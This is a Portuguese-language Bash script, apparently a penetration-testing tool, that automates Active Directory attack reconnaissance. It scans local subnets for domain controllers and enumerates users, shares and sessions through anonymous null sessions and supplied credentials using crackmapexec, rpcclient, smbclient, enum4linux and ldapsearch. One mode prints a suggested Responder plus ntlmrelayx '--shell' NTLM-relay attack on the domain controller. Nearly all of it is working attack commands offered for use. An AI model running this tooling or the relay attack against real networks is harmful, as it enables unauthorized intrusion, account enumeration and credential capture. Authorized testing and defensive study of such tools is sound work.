#!/bin/bash

###########################
#   AD ENUM AVANÇADO      #
#     por Henrique        #
###########################

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'

check_dependencies() {
    echo -e "${GREEN}[+] Verificando dependências...${NC}"
    DEPENDENCIAS=(nmap smbclient rpcclient ldapsearch crackmapexec enum4linux responder ntlmrelayx.py)
    for cmd in "${DEPENDENCIAS[@]}"; do
        if ! command -v "$cmd" &> /dev/null; then
            echo -e "${RED}[-] $cmd não encontrado. Instale antes de continuar.${NC}"
        fi
    done
}

discover_dc() {
    echo -e "${GREEN}[+] Buscando Domain Controllers em todas as interfaces ativas...${NC}"
    SUBNETS=$(ip -4 -o addr show up scope global | awk '{print $4}')
    if [[ -z "$SUBNETS" ]]; then
        echo -e "${RED}[-] Nenhuma interface de rede ativa com IP global detectada.${NC}"
        exit 1
    fi
    > dc_scan.txt
    for SUBNET in $SUBNETS; do
        echo "[*] Escaneando $SUBNET..."
        nmap -p 88,389 --open "$SUBNET" -oG - >> dc_scan.txt 2>/dev/null
    done
    DC_IPS=$(grep "Ports: 88/open" dc_scan.txt | awk '{print $2}' | sort -u)
    if [[ -z "$DC_IPS" ]]; then
        echo -e "${RED}[-] Nenhum DC encontrado.${NC}"
        exit 1
    else
        echo -e "${GREEN}[+] DCs encontrados:${NC}"
        select ip in $DC_IPS; do
            if [[ -n "$ip" ]]; then
                TARGET_IP="$ip"
                echo "[+] Usando $TARGET_IP como DC."
                break
            fi
        done
    fi
}

anonymous_advanced() {
    echo -e "${GREEN}[+] Modo Anônimo Avançado${NC}"
    mkdir -p "$OUTPUT_DIR"

    crackmapexec smb $TARGET_IP -u '' -p '' --shares > "$OUTPUT_DIR/cme_shares.txt"
    crackmapexec smb $TARGET_IP -u '' -p '' --sessions > "$OUTPUT_DIR/cme_sessions.txt"
    crackmapexec smb $TARGET_IP -u '' -p '' --users > "$OUTPUT_DIR/cme_users.txt"

    rpcclient -N $TARGET_IP -c "srvinfo" > "$OUTPUT_DIR/rpc_srvinfo.txt" 2>/dev/null
    rpcclient -N $TARGET_IP -c "enumdomusers" > "$OUTPUT_DIR/rpc_enumusers.txt" 2>/dev/null
    rpcclient -N $TARGET_IP -c "netshareenum" > "$OUTPUT_DIR/rpc_shares.txt" 2>/dev/null

    echo "[*] Sugestão ofensiva (Responder + NTLMRelayX):"
    echo "responder -I eth0"
    echo "ntlmrelayx.py -t smb://$TARGET_IP --shell"
}

anonymous_basic() {
    echo -e "${GREEN}[+] Modo Anônimo Básico${NC}"
    mkdir -p "$OUTPUT_DIR"
    smbclient -L //$TARGET_IP -N > "$OUTPUT_DIR/smb_shares.txt"
    rpcclient -N $TARGET_IP -c enumdomusers > "$OUTPUT_DIR/rpc_users.txt" 2>/dev/null
    enum4linux -a $TARGET_IP > "$OUTPUT_DIR/enum4linux.txt" 2>/dev/null
}

authenticated_enum() {
    echo -e "${GREEN}[+] Modo Autenticado${NC}"
    mkdir -p "$OUTPUT_DIR"
    ldapsearch -x -H ldap://$TARGET_IP -b "dc=${DOMAIN//./,dc=}" > "$OUTPUT_DIR/ldapsearch.txt" 2>/dev/null
    rpcclient -U "$USERNAME%$PASSWORD" $TARGET_IP -c enumdomusers > "$OUTPUT_DIR/rpc_users.txt"
    smbclient -L //$TARGET_IP -U "$USERNAME%$PASSWORD" > "$OUTPUT_DIR/smb_shares.txt"
    crackmapexec smb $TARGET_IP -u $USERNAME -p $PASSWORD --shares --users --groups --sessions > "$OUTPUT_DIR/cme.txt"
}

get_domain() {
    echo "[+] Tentando identificar domínio..."
    DOMAIN_INFO=$(smbclient -L //$TARGET_IP -N 2>/dev/null | grep -i 'Workgroup' | awk '{print $2}')
    if [[ -z "$DOMAIN_INFO" ]]; then
        echo "[-] Domínio não identificado."
        DOMAIN="UNKNOWN"
    else
        DOMAIN="$DOMAIN_INFO"
        echo "[+] Domínio: $DOMAIN"
    fi
}

### EXECUÇÃO ###
check_dependencies
discover_dc
get_domain

read -p "[?] Escolha o modo: [1] Anônimo Básico [2] Anônimo Avançado [3] Autenticado: " MODO
DATA=$(date +%Y-%m-%d)

if [[ "$MODO" == "1" ]]; then
    OUTPUT_DIR="EnumAD-${DATA}/${TARGET_IP}-anon"
    anonymous_basic
elif [[ "$MODO" == "2" ]]; then
    OUTPUT_DIR="EnumAD-${DATA}/${TARGET_IP}-anon_avancado"
    anonymous_advanced
elif [[ "$MODO" == "3" ]]; then
    read -p "Usuário: " USERNAME
    read -p "Senha: " PASSWORD
    OUTPUT_DIR="EnumAD-${DATA}/${TARGET_IP}-autenticado"
    authenticated_enum
else
    echo "Opção inválida."
    exit 1
fi

echo "[+] Enumeração concluída. Resultados salvos em: $OUTPUT_DIR"
